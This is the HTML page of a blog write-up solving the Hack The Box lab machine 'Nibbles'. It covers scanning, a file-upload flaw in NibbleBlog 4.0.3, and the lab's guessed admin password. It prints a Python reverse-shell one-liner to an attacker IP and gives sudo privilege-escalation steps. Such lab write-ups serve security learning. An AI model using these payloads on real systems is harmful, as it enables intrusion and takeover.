@@ -1,0 +1,437 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Nibbles - Hack The Box</title>
+  <meta name="description" content="Resolution of the Nibbles machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Nibbles - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/nibbles">
+  <meta property="og:description" content="Resolution of the Nibbles machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/nibbles">
+  <meta name="twitter:title" content="Nibbles - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Nibbles machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/nibbles/nibbles-00-e3074aca3acd7fe015d9056943df3ff486b39645fc379e63722355ab926362eb.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/nibbles/nibbles-00-e3074aca3acd7fe015d9056943df3ff486b39645fc379e63722355ab926362eb.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Nibbles - Hack The Box</h1>
+            <p>Resolution of the Nibbles machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    February 27, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      6 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/nibbles/nibbles-00-e3074aca3acd7fe015d9056943df3ff486b39645fc379e63722355ab926362eb.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-00-e3074aca3acd7fe015d9056943df3ff486b39645fc379e63722355ab926362eb.png" alt="Nibbles banner" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-00-e3074aca3acd7fe015d9056943df3ff486b39645fc379e63722355ab926362eb.png" data-zooming-width="596" data-zooming-height="380">
+</a></p>
+
+<p>Nibbles was my first owned HTB machine and the first one that I tried, easy for beginners, requires some <code class="highlighter-rouge">enumeration</code> and <code class="highlighter-rouge">web recon</code> to reach the first step of the box (user.txt). As soon as we get inside the system we need Googling exploits and aditional enumeration over system process to escalate privileges.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> nibbles.nmap 10.10.10.75
+
+<span class="c"># Nmap 7.70 scan initiated Fri Nov 15 09:27:17 2019 as: nmap -sV -sC -oA nibbles.nmap 10.10.10.75</span>
+Nmap scan report <span class="k">for </span>10.10.10.75
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Fri Nov 15 09:27:39 2019 -- 1 IP address (1 host up) scanned in 22.49 seconds</span></code></pre></figure>
+
+<p>The web port is open so we check out and what we see is a simple “Hello Word” page but checking the page source code there’s a HTML comment revealing what appear to be a directory named <code class="highlighter-rouge">/nibbleblog/</code></p>
+
+<p><a href="/assets/hackthebox/nibbles/nibbles-01-928ab3475d6d4377e704b33b3f57d03c6dfacbfd47fe38cfe63e9799192189e3.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-01-928ab3475d6d4377e704b33b3f57d03c6dfacbfd47fe38cfe63e9799192189e3.png" alt="Nibbles Web" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-01-928ab3475d6d4377e704b33b3f57d03c6dfacbfd47fe38cfe63e9799192189e3.png" data-zooming-width="472" data-zooming-height="277">
+</a></p>
+
+<p>So let’s perform some web enumeration with an excellent tool named <a href="https://github.com/OJ/gobuster" target="_blank">gosbuster</a></p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.75 <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt
+
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.75
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2019/11/15 09:31:11 Starting gobuster
+<span class="o">===============================================================</span>
+/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+<span class="o">===============================================================</span>
+2019/11/15 09:32:11 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>Because we didn’t found any relevant results, let’s try with the directory found earlier:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.75/nibbleblog/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt
+
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.75/nibbleblog/
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2019/11/15 09:33:42 Starting gobuster
+<span class="o">===============================================================</span>
+/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/admin <span class="o">(</span>Status: 301<span class="o">)</span>
+/admin.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/content <span class="o">(</span>Status: 301<span class="o">)</span>
+/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/languages <span class="o">(</span>Status: 301<span class="o">)</span>
+/plugins <span class="o">(</span>Status: 301<span class="o">)</span>
+/README <span class="o">(</span>Status: 200<span class="o">)</span>
+/themes <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2019/11/15 09:34:43 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>Accessing the admin directory we can see a web form and that’s it.
+Looking for the directories above one file catch your attention, and it’s the <code class="highlighter-rouge">README</code></p>
+
+<p><a href="/assets/hackthebox/nibbles/nibbles-02-e732e24679bff3112d97cb4933b6c6c69d8f4312c6d4946acc940997dd36277c.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-02-e732e24679bff3112d97cb4933b6c6c69d8f4312c6d4946acc940997dd36277c.png" alt="Nibbles Web README" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-02-e732e24679bff3112d97cb4933b6c6c69d8f4312c6d4946acc940997dd36277c.png" data-zooming-width="481" data-zooming-height="419">
+</a></p>
+
+<p>As we can see the web application it’s named <code class="highlighter-rouge">NibbleBlog</code> version <code class="highlighter-rouge">4.0.3</code>, Googling it we can see some interesting things:</p>
+
+<p><a href="/assets/hackthebox/nibbles/nibbles-03-76eb1a02079dcde02904716041aa775ecb7ea4dfa852dd1ac7d4ff0aeead5d75.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-03-76eb1a02079dcde02904716041aa775ecb7ea4dfa852dd1ac7d4ff0aeead5d75.png" alt="Nibbles Googling" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-03-76eb1a02079dcde02904716041aa775ecb7ea4dfa852dd1ac7d4ff0aeead5d75.png" data-zooming-width="756" data-zooming-height="375">
+</a></p>
+
+<p>The NibbleBlog version 4.0.3 contains a vulnerability in one of his plugins, more precisely on the image upload plugin named <code class="highlighter-rouge">My Image</code>, then analyzing the PHP source code of the vulnerable part we can see that there’s no sanatize on the upload that prevents the user from upload malicious files to the web application.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span> <span class="nv">$plugin</span><span class="o">-&gt;</span><span class="na">init_db</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span> 
+  <span class="c1">// upload files </span>
+  <span class="k">foreach</span><span class="p">(</span><span class="nv">$_FILES</span> <span class="k">as</span> <span class="nv">$field_name</span><span class="o">=&gt;</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span> 
+    <span class="nv">$destination</span> <span class="o">=</span> <span class="nx">PATH_PLUGINS_DB</span><span class="o">.</span><span class="nv">$plugin</span><span class="o">-&gt;</span><span class="na">get_dir_name</span><span class="p">();</span> 
+    <span class="nv">$complete</span> <span class="o">=</span> <span class="nv">$destination</span><span class="o">.</span><span class="s1">'/'</span><span class="o">.</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'.'</span><span class="o">.</span><span class="nv">$extension</span><span class="p">;</span> 
+
+    <span class="c1">// Upload the new file and move </span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$complete</span><span class="p">))</span> <span class="p">{</span> 
+      <span class="c1">// Resize images if requested by the plugin </span>
+      <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_resize'</span><span class="p">]))</span> <span class="p">{</span> 
+        <span class="nv">$width</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_width'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_width'</span><span class="p">]</span><span class="o">:</span><span class="mi">200</span><span class="p">;</span> 
+        <span class="nv">$height</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_height'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_height'</span><span class="p">]</span><span class="o">:</span><span class="mi">200</span><span class="p">;</span> 
+        <span class="nv">$option</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_option'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_option'</span><span class="p">]</span><span class="o">:</span><span class="s1">'auto'</span><span class="p">;</span> 
+        <span class="nv">$quality</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_quality'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$field_name</span><span class="o">.</span><span class="s1">'_quality'</span><span class="p">]</span><span class="o">:</span><span class="mi">100</span><span class="p">;</span>
+        <span class="nv">$Resize</span><span class="o">-&gt;</span><span class="na">setImage</span><span class="p">(</span><span class="nv">$complete</span><span class="p">,</span> <span class="nv">$width</span><span class="p">,</span> <span class="nv">$height</span><span class="p">,</span> <span class="nv">$option</span><span class="p">);</span> 
+        <span class="nv">$Resize</span><span class="o">-&gt;</span><span class="na">saveImage</span><span class="p">(</span><span class="nv">$complete</span><span class="p">,</span> <span class="nv">$quality</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span> 
+      <span class="p">}</span> 
+    <span class="p">}</span> 
+  <span class="p">}</span> 
+
+  <span class="nb">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'plugin'</span><span class="p">]);</span> 
+
+  <span class="c1">// update fields $plugin-&gt;set_fields_db($_POST);</span>
+  <span class="nx">Session</span><span class="o">::</span><span class="na">set_alert</span><span class="p">(</span><span class="nv">$_LANG</span><span class="p">[</span><span class="s1">'CHANGES_HAS_BEEN_SAVED_SUCCESSFULLY'</span><span class="p">]);</span> <span class="p">}</span> <span class="p">}</span></code></pre></figure>
+
+<p>Exploit and vulnerability analysis credits: <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html" target="_blank">NibbleBlog 4.0.3: Code Execution</a></p>
+
+<p>Now there’s just one thing stopping us right now: the exploit requires the login and password to the Nibbles admin panel to work, it’s an authenticated exploit and as soon as we’re able to access the upload section the magic can finally start.</p>
+
+<p>Guessing the login and password we can easily retrieve the credentials without any automated bruteforce: <code class="highlighter-rouge">admin:nibbles</code></p>
+
+<h1 id="exploiting---exploiting-the-vulnerability">Exploiting - Exploiting the vulnerability</h1>
+
+<p>There’s a metasploit module for this vulnerability, available at: <a href="https://www.exploit-db.com/exploits/38489" target="_blank">Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)</a></p>
+
+<p>You can load it on msfconsole, fill the options and run.</p>
+
+<p>I developed a custom Python exploit for this vulnerability and it’s available on my GitHub repository :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/nibbles" target="_blank">Nibbles Exploit</a></p>
+
+<p><a href="/assets/hackthebox/nibbles/nibbles-04-ca90afe7905112dce0f83c08c8085febc72abc995c69391a31bc04ec4a86f438.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-04-ca90afe7905112dce0f83c08c8085febc72abc995c69391a31bc04ec4a86f438.png" alt="Nibbles Exploit" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-04-ca90afe7905112dce0f83c08c8085febc72abc995c69391a31bc04ec4a86f438.png" data-zooming-width="894" data-zooming-height="168">
+</a></p>
+
+<p>My script signin on administrative panel and makes an upload a PHP web-shell using multipart/data request to the vulnerable plugin.</p>
+
+<p><a href="/assets/hackthebox/nibbles/nibbles-05-95caafbda30dd2f970d28a8b157bc820cb938fc07bd6cb0ef0e59679adb03577.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-05-95caafbda30dd2f970d28a8b157bc820cb938fc07bd6cb0ef0e59679adb03577.png" alt="Nibbles Exploit" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-05-95caafbda30dd2f970d28a8b157bc820cb938fc07bd6cb0ef0e59679adb03577.png" data-zooming-width="767" data-zooming-height="76">
+</a></p>
+
+<p>Then after a couple seconds my script makes a GET request to the PHP webshell containing the following Python payload, finally triggering your listening netcat.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/nibbles/nibbles-06-33475a7431669767ef72736a9216d106374eae6772ab8c10ec461f8f91c5c0cb.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-06-33475a7431669767ef72736a9216d106374eae6772ab8c10ec461f8f91c5c0cb.png" alt="Nibbles Exploit" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-06-33475a7431669767ef72736a9216d106374eae6772ab8c10ec461f8f91c5c0cb.png" data-zooming-width="422" data-zooming-height="98">
+</a></p>
+
+<p>The user.txt is owned.</p>
+
+<h1 id="post-exploitation---enumeration-and-privilege-escalation">Post Exploitation - Enumeration and Privilege Escalation</h1>
+
+<p>After the user.txt your next move is find some point to escalate the privilege to the superuser, with a simple <code class="highlighter-rouge">sudo -l</code> we can easily spot your priv esc point.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: unable to resolve host Nibbles: Connection timed out
+Matching Defaults entries <span class="k">for </span>nibbler on Nibbles:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre></figure>
+
+<p>We verify that neither the directory <code class="highlighter-rouge">/home/nibbler/personal/stuff</code> or the file <code class="highlighter-rouge">monitor.sh</code> exists, so we create the directory and with the file inside.
+Basically the system allows that only the file named <code class="highlighter-rouge">monitor.sh</code> under the directory <code class="highlighter-rouge">/home/nibbler/personal/stuff</code> must be executed by root without giving any password, even executed by an user without privilege.
+We put a simple reverse shell inside the file and execute the script using the full path, then we got via netcat listener a root shell!</p>
+
+<p><a href="/assets/hackthebox/nibbles/nibbles-07-e2c89f56711a2ed75d476447b0d3f645d9cf29b9cdc7638b36c0d73ae656ef10.png">
+  <img src="/assets/hackthebox/nibbles/nibbles-07-e2c89f56711a2ed75d476447b0d3f645d9cf29b9cdc7638b36c0d73ae656ef10.png" alt="Nibbles Privilege Escalation" class="zooming" data-rjs="/assets/hackthebox/nibbles/nibbles-07-e2c89f56711a2ed75d476447b0d3f645d9cf29b9cdc7638b36c0d73ae656ef10.png" data-zooming-width="423" data-zooming-height="100">
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Nibbles+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/nibbles%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/nibbles" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
